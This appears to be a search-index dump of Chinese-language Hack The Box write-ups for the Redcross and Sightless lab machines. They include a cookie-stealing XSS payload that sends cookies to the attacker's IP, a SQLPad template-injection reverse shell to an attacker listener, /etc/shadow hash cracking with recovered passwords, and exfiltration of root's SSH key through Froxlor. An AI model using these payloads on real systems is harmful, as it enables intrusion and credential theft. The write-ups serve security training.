abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d\n</code></pre> <p>\u5176\u4e2d-a\u6307\u5b9a\u7834\u89e3\u6a21\u5f0f\uff0c3\u4e3a\u6307\u5b9a\u63a9\u7801\u7834\u89e3\uff0c\u540e\u9762\u8ddf\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5bc6\u6587\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u8981\u7206\u7834\u7684\u6570\u503c</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u7206\u7834\u51fa\u6765\u7684\u5bc6\u7801\u4e3a\uff1asusan_nasus_413759210\uff0c\u4f7f\u7528susan/susan_nasus_413759210\u767b\u5f55\u5230\u4e3b\u673a</p> <pre><code>ssh susan@10.10.11.253\n</code></pre> <pre><code>sudo su root\n</code></pre> <p></p>"},{"location":"CTF/HTB/Linux-Redcross/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Linux-Redcross/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.113 -oA scans/ports\n...\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n...\nroot@kali# nmap -sT -sC -sV -O -p22,80,443 10.10.10.113 -oA scans/details\n...\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)\n80/tcp  open  http     Apache httpd 2.4.25\n443/tcp open  ssl/http Apache httpd 2.4.25\nService Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n...\n</code></pre> <p>\u5f00\u653e\u4e86\u63d0\u4f9bSSH\u670d\u52a1\u768422\u7aef\u53e3\u3001\u63d0\u4f9bhttp\u670d\u52a1\u768480\u7aef\u53e3\u4ee5\u53ca\u63d0\u4f9bhttps\u670d\u52a1\u7684443\u7aef\u53e3\u3002</p>"},{"location":"CTF/HTB/Linux-Redcross/index.html#website-tcp-443","title":"Website -TCP 443","text":"<p>\u8bbf\u95ee<code>http://10.10.10.113</code>\u8fd4\u56de301\u91cd\u5b9a\u5411\u5230<code>https://intra.redcross.htb</code>\u4e4b\u540e\u5c06\u57df\u6dfb\u52a0\u5230\u6211\u7684hosts\u6587\u4ef6\u4e2d\uff0c\u518d\u6b21\u8bbf\u95ee\u5c31\u4f1a\u91cd\u5b9a\u5411\u5230<code>https://intra.redcross.htb/?page=login\u5e76\u663e\u793a\u6210\u529f\u767b\u5f55\u5230</code>RedCross Messaging Intranet\u3002</p> <p></p>"},{"location":"CTF/HTB/Linux-Redcross/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<p>\u6211\u4eec\u4f7f\u7528gobuster\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u3002</p> <pre><code>root@kali# gobuster -k -u https://intra.redcross.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40\n...\n/index.php (Status: 302)\n/images (Status: 301)\n/pages (Status: 301)\n/documentation (Status: 301)\n/javascript (Status: 301)\n/init.php (Status: 200)\n...\n</code></pre> <p>\u5728 /documentation \u4e2d\u5bfb\u627e\u6587\u6863\u6269\u5c55\u540d</p> <pre><code>root@kali# gobuster -k -u https://intra.redcross.htb/documentation -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,pdf -t 20\n=====================================================\n/account-signup.pdf (Status: 200)\n=====================================================\n</code></pre> <p></p> <p>\u8bbf\u95ee\u8be5\u7f51\u5740\u65f6\uff0c\u5f97\u5230\u4e00\u4e2a\u8054\u7cfb\u8868\u683c\uff1a</p> <p></p>"},{"location":"CTF/HTB/Linux-Redcross/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Linux-Redcross/index.html#xss","title":"XSS\u6f0f\u6d1e\u68c0\u6d4b","text":"<p>\u5206\u522b\u5728\u4e09\u4e2a\u6587\u672c\u6846\u4e2d\u5206\u522b\u6d4b\u8bd5XSS\u68c0\u6d4b\u8bed\u53e5<code>&lt;img src=\"javascript.:alert('1234')\"&gt;</code>\u3002</p> <p>\u53d1\u73b0\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e8c\u4e2a\u8f93\u5165\u6846\u7684\u663e\u793a\u7ed3\u679c\u4e3a\uff1a</p> <p></p> <p>\u7b2c\u4e09\u4e2a\u8f93\u5165\u6846\u7684\u663e\u793a\u7ed3\u679c\u4e3a\u6ca1\u6709\u63d0\u793a\u5185\u5bb9\u5b58\u5728\u5b89\u5168\u98ce\u9669\uff0c\u8fd9\u610f\u5473\u7740\u8be5\u6587\u672c\u6846\u53ef\u80fd\u5b58\u5728XSS\u6f0f\u6d1e\u7684\u3002</p> <p></p> <p>\u56e0\u4e3a\u7b2c\u4e09\u4e2a\u6587\u672c\u6846\u5e76\u4e0d\u4f1a\u8fdb\u884c\u56de\u663e\u64cd\u4f5c\uff0c\u56e0\u6b64\u65e0\u6cd5\u83b7\u5f97\u8b66\u544a\u5f39\u7a97\u663e\u793a\uff0c\u6240\u4ee5\u6211\u4eec\u6362\u4e00\u79cd\u6d4b\u8bd5\u601d\u8def\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728XSS\u6f0f\u6d1e\uff0c\u5728\u8be5\u6587\u672c\u6846\u8f93\u5165\uff1a</p> <pre><code>&lt;script&gt;var myimg = new Image();myimg.src = 'http://10.10.14.7/q?='+ document.cookie;&lt;/script&gt;\n</code></pre> <p>\u4ee3\u7801\u4e2d\u7684ip\u4e3a\u6211\u7684Kali\u4e3b\u673a\u7684ip\u5730\u5740\u3002\u8fd9\u4e2a\u811a\u672c\u7684\u76ee\u7684\u662f\u5229\u7528\u56fe\u50cf\u5bf9\u8c61\u7684src\u5c5e\u6027\uff0c\u5c06\u7528\u6237\u7684cookie\u4fe1\u606f\u53d1\u9001\u5230http://10.10.14.7/q\u3002</p> <p><code>var myimg = new Image();</code> :\u8fd9\u884c\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u56fe\u50cf\u5bf9\u8c61\uff0c\u540d\u4e3amyimg\u3002</p> <p><code>myimg.src = 'http://10.10.14.7/q?='+ document.cookie;</code>:\u8fd9\u884c\u4ee3\u7801\u8bbe\u7f6e\u4e86\u56fe\u50cf\u5bf9\u8c61\u7684src\u5c5e\u6027\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a\u7279\u5b9a\u7684URL\u3002\u8fd9\u4e2aURL\u5305\u542b\u4e86\u7528\u6237\u7684cookie\u4fe1\u606f\u3002document.cookie\u4f1a\u83b7\u53d6\u5f53\u524d\u9875\u9762\u7684\u6240\u6709cookie\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3a\u67e5\u8be2\u53c2\u6570\u6dfb\u52a0\u5230URL\u7684\u672b\u5c3e\u3002</p> <p></p> <p>\u5728\u6587\u672c\u6846\u8f93\u5165xss\u6d4b\u8bd5poc\u540e\uff0c\u8fd8\u9700\u8981\u518dKali\u4e3b\u673a\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff1a<code>python3 -m http.server 80</code></p> <p></p> <p>\u4e0a\u8ff0\u64cd\u4f5c\u505a\u5b8c\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0kali\u4e3b\u673a\u7684http\u670d\u52a1\u51fa\u73b0\u4e86\u4e00\u4e2a\u76ee\u6807\u4e3b\u673a\u8bbf\u95eeKali\u7684\u8bf7\u6c42\u94fe\u63a5\uff0c\u94fe\u63a5\u4e2d\u6709\u4e00\u4e2aphpsessionid,\u8bc1\u660e\u8be5\u540e\u7aef\u786e\u5b9e\u5b58\u5728XSS\u6f0f\u6d1e\u3002</p>"},{"location":"CTF/HTB/Linux-Redcross/index.html#xssphpsessionidweb","title":"\u5229\u7528XSS\u83b7\u53d6\u7684PHPSESSIONID\u83b7\u53d6Web\u7ba1\u7406\u5458\u6743\u9650","text":"<p>\u56de\u5230\u767b\u5f55\u754c\u9762https://intra.redcross.htb/?page=login\u3002\u901a\u8fc7F12\u6253\u5f00\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8c03\u8bd5\u6a21\u5f0f\u3002</p> <p></p> <p>\u5c06cookie\u66ff\u6362\u4e3a\u4e4b\u524d\u5229\u7528xss\u6f0f\u6d1e\u6b3a\u9a97\u6240\u83b7\u53d6\u7684phpsessonid\uff0c\u53d1\u73b0\u6210\u529f\u7ed5\u8fc7\u767b\u5f55\u6846\uff0c\u76f4\u63a5\u83b7\u53d6Web\u767b\u5f55\u7ba1\u7406\u5458\u7684\u6743\u9650\u3002</p> <p></p>"},{"location":"CTF/HTB/Linux-Redcross/index.html#sql","title":"sql\u6ce8\u5165\u6d4b\u8bd5","text":"<p>\u5728\u62ff\u5230Web\u7ba1\u7406\u5458\u6743\u9650\u754c\u9762\u540e\uff0c\u5c1d\u8bd5sql\u6ce8\u5165\u6d4b\u8bd5\uff1ahttps://intra.redcross.htb/?o=1%27&amp;page=app</p> <p>\u53ef\u80fd\u5b58\u5728\u7684\u6ce8\u5165\u70b9  \uff1aGET /?o=2&amp;page=app</p> <p></p> <p>\u901a\u8fc7sql\u6ce8\u5165\u7684\u62a5\u9519\u663e\u793a\uff0c\u540d\u4e3aadmin webpanel\u7684\u5e73\u53f0\uff0c\u7740\u610f\u5473\u7740\u5f53\u524d\u57df\u540d\u5b58\u5728\u5176\u4ed6\u7684\u5b50\u57df\u540d\u7cfb\u7edf\u3002</p> <p>\u6211\u4eec\u9700\u8981\u628a\u8be5\u5b50\u57df\u540d\u52a0\u5165Kali\u4e3b\u673a\u7684hosts\u6587\u4ef6\u4e2d\uff0c\u66f4\u65b0\u540e\u7684hosts\u6587\u4ef6\u5982\u4e0b\u6240\u793a\uff1a</p> <p></p> <p>\u8bbf\u95eehttps://admin.redcross.htb/?page=login</p> <p></p> <p>\u518d\u6b21\u4f7f\u7528admin\u8d26\u53f7\u7684PHPSESSIONID\uff0c\u53d1\u73b0\u4f9d\u7136\u6709\u6548\uff0c\u6210\u529f\u767b\u5f55\u8be5admin pannel\u7684web\u7cfb\u7edf</p> <p></p> <p>\u70b9\u51fb\u5de6\u8fb9\u7684\u201cUser management\"\uff0cadd\u4e00\u4e2a\u7528\u6237</p> <p></p> <p></p> <p>\u5982\u4e0a\u5982\u6240\u793a\uff0c\u65b0\u589e\u7684\u7528\u6237\u5206\u914d\u4e86UID\u548cGID\uff0c\u8fd9\u770b\u8d77\u6765\u5f88\u50cfLInux\u7cfb\u7edf\u4e2d\u7684\u7528\u6237\u7c7b\u578b\uff0c\u6240\u4ee5\u5c1d\u8bd5\u521a\u624d\u88ab\u5206\u914d\u7684\u8d26\u53f7test,\u5229\u7528ssh\u6210\u529f\u767b\u5f55\u76ee\u6807\u4e3b\u673a\u7cfb\u7edf\uff0c\u83b7\u53d6\u4e00\u4e2a\u6bd4\u8f83\u4f4e\u7684\u6743\u9650\u3002</p> <p></p>"},{"location":"CTF/HTB/Linux-Redcross/index.html#_3","title":"\u6743\u9650\u63d0\u5347","text":"<p>\u4e0b\u56fe\u4e2d\u7684\u6587\u672c\u8f93\u5165\u6846\u53ef\u80fd\u5b58\u5728\u6388\u6743\u540e\u7684\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u4e8e\u662f\u7b80\u5355\u7684\u6d4b\u8bd5\u4e00\u4e0b</p> <p></p> <p>\u4e0b\u56fe\u6240\u793a\uff0c\u7ecf\u6d4b\u8bd5\u540e\u53d1\u73b0\u4f1a\u56de\u663e\u4e00\u4e2a\u9519\u8bef\u63d0\u793a\u9875\u9762\uff0c\u201dERR: Invalid IP Address format\u201c,\u5927\u610f\u662f\u8f93\u5165\u4e0d\u5408\u6cd5\u7684IP\u5730\u5740\u683c\u5f0f\uff0c\u8bf4\u660e\u8be5\u6587\u672c\u6846\u7684\u540e\u53f0\u5b58\u5728\u7c7b\u4f3cwaf\u7684IP\u5730\u5740\u683c\u5f0f\u7684\u68c0\u6d4b\u3002</p> <p></p> <p>\u4f7f\u7528burpsuite\u8fdb\u884c\u6293\u5305\uff0c\u6dfb\u52a0\u6210\u529f\u4e4b\u540e\u663e\u793a\u4e86\u4e00\u4e2adeny\u6309\u94ae\uff0c\u6211\u4e5f\u70b9\u51fb\u5220\u9664\u4e86\u4e00\u4e0b\uff0c\u5177\u4f53\u6570\u636e\u5305\u5982\u4e0b</p> <p></p> <p></p> <p>\u5c06\u4e24\u4e2a\u8bf7\u6c42\u6570\u636e\u5305\u6d4b\u8bd5\u4e86\u4e0b\uff0c\u6700\u540e\u53d1\u73b0\u5220\u9664\u9632\u706b\u5899\u6d4b\u91cf\u7684\u8bf7\u6c42\u6570\u636e\u5305\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u5177\u4f53\u5982\u4e0b</p> <p></p> <p>\u7136\u540e\u4f7f\u7528which\u67e5\u770b\u4e86\u76ee\u6807\u53ef\u80fd\u5b58\u5728\u7684\u73af\u5883\uff0c\u786e\u8ba4\u5b58python\u73af\u5883\uff0c\u76f4\u63a5\u4f7f\u7528python\u53cd\u5f39\u4ee3\u7801\u8fdb\u884c\u53cd\u5f39shell.</p> <p></p> <p>\u6210\u529f\u53cd\u5f39shell</p> <p></p> <p>\u7136\u540e\u5c31\u662f\u7ffb\u770b\u76ee\u6807\u9776\u673a\u7684\u5404\u79cd\u6587\u4ef6\u4e86\uff0c\u8fd9\u91cc\u7ffb\u770b\u4e86\u5bb6\u76ee\u5f55\u770b\u5230user.txt\u4f46\u662f\u6ca1\u6709\u6743\u9650\u8bfb\u53d6\uff0c\u7136\u540e\u7ffb\u770b\u4e86\u5f53\u524dweb\u5e94\u7528\u7684\u6839\u76ee\u5f55\u5404\u4e2a\u6587\u4ef6\uff0c\u53d1\u73b0\u4e86\u767b\u5f55\u6570\u636e\u5e93\u7684\u5404\u79cd\u8d26\u53f7\u548c\u5bc6\u7801</p> <p></p> <p>\u4f7f\u7528\u6570\u636e\u5e93\u7ba1\u7406\u5458\u767b\u5f55\u6570\u636e\u5e93</p> <p></p> <p>\u6309\u7167LInux\u64cd\u4f5c\u7cfb\u7edf\u7684\u8bbe\u5b9a\uff0c\u4fee\u6539UID\u548cGID\u3001\u5bc6\u7801\u7684\u64cd\u4f5c\u4e5f\u4f1a\u5f15\u53d1\u76ee\u6807\u7cfb\u7edf\u4e2d/etc/passwd\u6587\u4ef6\u7684\u5bf9\u5e94\u7528\u6237\u4fe1\u606f\u3002\u6240\u4ee5\uff0c\u628atricia\u7684UID\u548cGID\u6539\u4e3a\u4e3a\u5177\u6709root\u6743\u9650\u7684\u6570\u503c\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u4f7f\u7528sudo su\u547d\u4ee4\u65f6\uff0ctricia\u76f4\u63a5\u62e5\u6709root\u6743\u9650\uff0c\u4e3a\u4e86\u540e\u671f\u63d0\u6743\u65b9\u4fbf\uff0c\u628atricia\u7684\u5bc6\u7801\u6539\u4e3asXuCKi7k3Xh/s\uff08\u89e3\u7801\u540e\u4e3atoor\uff09</p> <p></p> <p>\u901a\u8fc7update passwd_table set gid=27 where username='tricia';</p> <p></p> <p>\u6700\u540e\uff0c\u901a\u8fc7\\q\u547d\u4ee4\u9000\u51fa\u8be5\u6570\u636e\u5e93\uff0c\u5229\u7528su tricia\u547d\u4ee4\u5207\u6362\u81f3tricia\u7528\u6237\uff0c\u8f93\u5165\u5bc6\u7801toor,\u6210\u4e3a\u5207\u6362\u81f3tricia\u7528\u6237\u3002</p> <p>\u8f93\u5165id\u547d\u4ee4\uff0c\u53d1\u73b0\u6210\u529f\u63d0\u6743\u81f3root\u3002</p> <p></p>"},{"location":"CTF/HTB/Linux-Sightless/index.html","title":"Enumeration","text":""},{"location":"CTF/HTB/Linux-Sightless/index.html#add-hosts","title":"Add hosts","text":"<p>\u5c1d\u8bd5\u8bbf\u95ee10.10.11.32\uff0c\u53d1\u73b0\u89e3\u6790\u540e\u57df\u540d.</p> <p></p> <p>\u7f16\u8f91/etc/hosts\u6587\u4ef6,\u786e\u4fdd\u7cfb\u7edf\u80fd\u591f\u5c06\u57df\u540d sightless.htb \u89e3\u6790\u4e3a\u6b63\u786e\u7684 IP \u5730\u5740 10.10.11.32</p> <pre><code>10.10.11.32 sightless.htb\n</code></pre>"},{"location":"CTF/HTB/Linux-Sightless/index.html#nmap","title":"Nmap","text":"<pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom]\n\u2514\u2500# nmap --min-rate 10000 -p- -Pn  10.10.11.32\n...\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n...\n</code></pre> <p>\u67e5\u770b\u7ed3\u679c\uff0c\u53d1\u73b0\u6253\u5f00\u4e86 3 \u4e2a\u7aef\u53e3\u3002</p>"},{"location":"CTF/HTB/Linux-Sightless/index.html#web-80","title":"Web - 80","text":"<p>\u5c1d\u8bd5\u5bfb\u627e\u5176\u4ed6\u4e1a\u52a1\u63a5\u53e3\u3002</p> <p></p> <p>\u5355\u51fb\u201c\u73b0\u5728\u5f00\u59cb\u201d\uff0c\u91cd\u5b9a\u5411\u5230<code>http://sqlpad.sightless.htb/</code>\uff0c\u5c06\u5176\u6dfb\u52a0\u5230\u6211\u4eec\u7684 /etc/hosts \u5e76\u8bbf\u95ee\u5b83</p> <p></p>"},{"location":"CTF/HTB/Linux-Sightless/index.html#search-vulnerabilities","title":"Search  vulnerabilities","text":"<p>\u6211\u4eec\u8981\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u67e5\u627e SQLPad \u7684\u7248\u672c\u4ee5\u67e5\u627e\u5df2\u77e5\u6f0f\u6d1e\u3002\u5355\u51fb\u53f3\u4e0a\u89d2\u7684 3 \u4e2a\u70b9\uff0c\u7136\u540e\u5355\u51fb About\uff08\u5173\u4e8e\uff09\uff0c\u6211\u4eec\u4f1a\u7acb\u5373\u83b7\u5f97\u7248\u672c\u3002</p> <p></p>"},{"location":"CTF/HTB/Linux-Sightless/index.html#cve-2022-0944","title":"CVE-2022-0944","text":"<pre><code>https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb\n</code></pre> <p>\u672c\u5730\u8fdb\u884c\u76d1\u542c\uff1a</p> <p></p> <p>SQLPAD\u4e0a\u6267\u884c\u5982\u4e0b\u64cd\u4f5c:\u5355\u51fb Connections \u548c Add Connection.</p> <pre><code>{{ process.mainModule.require('child_process').exec('(/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.12/4444 0&gt;&amp;1\" &amp;)') }}\n</code></pre> <p></p> <p>\u6210\u529f\u5f97\u5230shell.</p> <p></p>"},{"location":"CTF/HTB/Linux-Sightless/index.html#docker-environment","title":"Docker Environment","text":"<p>\u6839\u76ee\u5f55\u4e0b\u6267\u884c<code>ls -liah</code>\u540e\uff0c\u53d1\u73b0\u5b58\u5728<code>.dockerenv</code>\uff0c\u8bc1\u660e\u662fdocker\u73af\u5883.</p> <p></p> <p>\u6240\u4ee5\u4e0b\u9762\u6211\u4eec\u8981\u60f3\u529e\u6cd5\u9003\u79bbdocker\u73af\u5883.</p> <pre><code>ls /home\n</code></pre> <p></p> <pre><code>cat /etc/shadow\n</code></pre> <p></p> <p>\u6211\u4eec\u73b0\u5728\u6709\u4e86 michael \u548c root \u7684\u54c8\u5e0c\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 hashcat \u6765\u7834\u89e3\u5b83\u4eec\u3002</p>"},{"location":"CTF/HTB/Linux-Sightless/index.html#hashcat","title":"Hashcat","text":"<pre><code>#hashcat '$6$YiFC5EHwcE/nqUgi$aG3i.wyHFMyabCBcYrYwGwMRIvZOOtSPO1WhpeGv7M.MWk6oHZDgCpcfVWCY.6p7YMGZTZazKs2xTdTgg0K5i1' /usr/share/wordlists/rockyou.txt --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n1800 | sha512crypt $6$, SHA512 (Unix) | Operating System\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\n$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside\n\nroot\nblindside\n\n#hashcat '$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/'   /usr/share/wordlists/rockyou.txt --show\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n1800 | sha512crypt $6$, SHA512 (Unix) | Operating System\n\nNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!\nDo NOT report auto-detect issues unless you are certain of the hash type.\n\n$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse\n\n\nroot\nblindside\n\n\nmichael\ninsaneclownposse\n</code></pre> <p>\u4f7f\u7528\u7834\u89e3\u540e\u7684\u5bc6\u7801\u8fde\u63a5\u5230 michael \u5e10\u6237\u5e76\u9003\u79bb docker \u5bb9\u5668\u3002</p> <pre><code>\u250c\u2500\u2500(root\u327fkali)-[/home/tom]\n\u2514\u2500# ssh michael@sightless.htb\nThe authenticity of host 'sightless.htb (10.10.11.32)' can't be established.\nED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.\nmichael@sightless.htb's password: \nLast login: Wed Sep 25 03:10:58 2024 from 10.10.14.192\nmichael@sightless:~$ \n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u90a3\u91cc\u5f97\u5230\u7b2c\u4e00\u4e2aflag.</p> <p></p>"},{"location":"CTF/HTB/Linux-Sightless/index.html#root","title":"root","text":"<p>\u901a\u8fc7 sudo \u6743\u9650\u3001SUID\u3001cron\u6ca1\u6709\u627e\u5230\u4efb\u4f55\u6709\u7528\u7684\u4e1c\u897f.</p> <p>\u67e5\u770b\u5f00\u653e\u7684\u7aef\u53e3\uff1a</p> <pre><code>ss -ltnp\n</code></pre> <p></p> <p>\u6bd4\u8f83\u5f15\u5165\u6ce8\u610f\u7684\u662f8080\u7aef\u53e3\uff0c\u5c068080\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730\u3002\u53d1\u73b0\u662ffroxlor\u7cfb\u7edf\uff0cfroxlor\u662f\u4e00\u6b3eweb\u63a7\u5236\u9762\u677f\u3002</p> <p>\u7f51\u4e0a\u67e5\u8be2\u76f8\u5173\u6f0f\u6d1e\u6ca1\u6709\u80fd\u7ed5\u8fc7\u767b\u5f55\u7684\uff0c\u6d4b\u8bd5\u7a77\u4e3e\u767b\u5f55\uff0csql\u6ce8\u5165\u3001\u9ed8\u8ba4\u7528\u6237\u540d\u5bc6\u7801\u7b49\u90fd\u65e0\u6cd5\u7ed5\u8fc7\u3002</p> <pre><code>ssh -L 8080:127.0.0.1:8080 michael@sightless.htb -N -f  \n</code></pre> <p>ssh: \u542f\u52a8 SSH \u5ba2\u6237\u7aef\u3002</p> <p>-L 8080:127.0.0.1:8080: \u6307\u5b9a\u672c\u5730\u7aef\u53e3\u8f6c\u53d1\uff0c\u5c06\u672c\u5730\u7684 8080 \u7aef\u53e3\u8f6c\u53d1\u5230\u8fdc\u7a0b\u4e3b\u673a sightless.htb \u7684 127.0.0.1\uff08\u5373\u8fdc\u7a0b\u4e3b\u673a\u672c\u8eab\uff09\u7684 8080 \u7aef\u53e3\u3002</p> <p>michael@sightless.htb: \u4ee5\u7528\u6237\u540d michael \u8fde\u63a5\u5230\u8fdc\u7a0b\u4e3b\u673a sightless.htb\u3002</p> <p>-N: \u4e0d\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4\uff0c\u4ec5\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002</p> <p>-f: \u5728\u540e\u53f0\u8fd0\u884c SSH \u4f1a\u8bdd\u3002</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u5c06\u4f60\u7684\u672c\u5730 8080 \u7aef\u53e3\u4e0e\u8fdc\u7a0b\u4e3b\u673a\u7684 8080 \u7aef\u53e3\u5efa\u7acb\u4e86\u5b89\u5168\u7684\u8fde\u63a5\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee http://localhost:8080 \u6765\u8bbf\u95ee\u8fdc\u7a0b\u670d\u52a1\u3002</p> <p>\u770b\u4e00\u4e0b http://127.0.0.1:8080/ \u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a Froxlor \u767b\u5f55\u9875\u9762\u3002</p> <p></p> <p>\u518d\u67e5\u770b\u8fdb\u7a0b\uff0c\u53d1\u73b0john\u7528\u6237\u542f\u7528\u4e86\u5f88\u591achrome\u7a0b\u5e8f\uff0c\u8fdb\u4e00\u6b65\u67e5\u770b\u547d\u4ee4\uff0c\u53d1\u73b0\u662fchrome\u7684\u8c03\u8bd5\u6a21\u5f0f\u3002</p> <pre><code>ps -aux\nps -aux | grep chrome\n</code></pre> <p></p> <p>\u7ecf\u8fc7\u641c\u7d22\uff0c\u53d1\u73b0chrome\u53ef\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5\uff0c\u8fd9\u4e00\u6b65\u9700\u8981\u5c06\u591a\u4e2a\u7aef\u53e3\u6620\u5c04\u672c\u5730\u3002\u6211\u8fd9\u91cc\u6620\u5c04\u4e86421411\u300136943\u30018080\u7aef\u53e3\u3002\u6839\u636e\u60c5\u51b5\u4e0d\u540c\uff0c\u53ef\u4ee5\u591a\u6620\u5c04\u51e0\u4e2a\u3002</p> <pre><code>ssh michael@10.10.11.32 -L 42141:localhost:42141\n</code></pre> <p>\u4e0b\u9762\u5728kali\u4e2d\u6253\u5f00chrome\uff0c\u8bbf\u95ee<code>chrome://inspect/#devices</code>\uff0c\u5728Configure\u91cc\u9762\u8bbe\u7f6e<code>127.0.0.1:port</code></p> <p></p> <p>\u5728\u8be5\u754c\u9762\u7b49\u4e00\u4f1a\uff0c\u4f60\u4f1a\u53d1\u73b0\u4e0b\u9762\u4f1a\u4e0d\u65ad\u8bbf\u95ee<code>http://admin.sightless.htb:8080</code></p> <p></p> <p>\u70b9\u51fbinspect\uff0c\u4f1a\u5f39\u51faDevTools\uff08\u8fd9\u4e00\u6b65\u8981\u591a\u8bd5\u51e0\u6b21\uff09</p> <p>\u70b9\u51fb\u4fdd\u7559\u65e5\u5fd7\uff0c\u8ba9\u5b83\u8bbf\u95ee\u51e0\u6b21\uff0c\u8fc7\u4e00\u4f1a\u6211\u4eec\u5c31\u80fd\u627e\u5230Froxlor\u7684\u7528\u6237\u540d\u5bc6\u7801\u3002 \u00a0 \u00a0</p> <p>\u8fd9\u91cc\u662f\u56e0\u4e3a\u672c\u5730\u5728\u8fdb\u884c\u8c03\u8bd5\u6216\u8005\u6d4b\u8bd5\uff0c\u4e0d\u65ad\u5faa\u73af\u8bbf\u95ee\u7f51\u7ad9\uff0c\u800c\u6211\u4eec\u4f7f\u7528\u8fdc\u7a0b\u8c03\u8bd5\u5219\u53ef\u4ee5\u770b\u5230\u8bbf\u95ee\u7f51\u7ad9\u7684\u8fc7\u7a0b\u3002</p> <pre><code>admin | ForlorfroxAdmin\n</code></pre> <p></p> <p>\u8bbf\u95ee<code>http://127.0.0.1:8080</code>\uff0c\u4f7f\u7528\u521a\u624d\u83b7\u53d6\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\uff0c\u6210\u529f\u8fdb\u5165\u540e\u53f0\u3002</p> <p></p> <p>\u6211\u4eec\u5c06root\u7684\u79c1\u94a5\u62f7\u8d1d\u5230tmp\u6587\u4ef6\u5939\uff0c\u8fdb\u5165PHP-FPM versions\uff0c\u4fee\u6539\u7b2c\u4e00\u884c\u7684php-fpm restart command\u3002</p> <p>\u6211\u4eec\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u53cd\u5f39shell\uff1f\u56e0\u4e3a\u547d\u4ee4\u884c\u5728\u4fdd\u5b58\u65f6\u4f1a\u6821\u9a8c\uff0c\u5177\u4f53\u68c0\u9a8c\u5185\u5bb9\u6ca1\u6709\u6d4b\u8bd5\uff0c\u4f46\u662f\u4eff\u9020\u539f\u547d\u4ee4\u7684\u4e09\u6bb5\u5f0f\u53ef\u4ee5\u901a\u8fc7\u6821\u9a8c\u3002</p> <pre><code>cp /root/.ssh/id_rsa /tmp/id_rsa\n</code></pre> <p></p> <p>\u5c06PHP-FPM\u529f\u80fd\u6253\u5f00\uff0c\u8fdb\u5165System\u4e0b\u7684Settings\uff0c\u5c06PHP-FPM\u91cc\u9762Enable php-fpm\u6253\u5f00\u3002</p> <p></p> 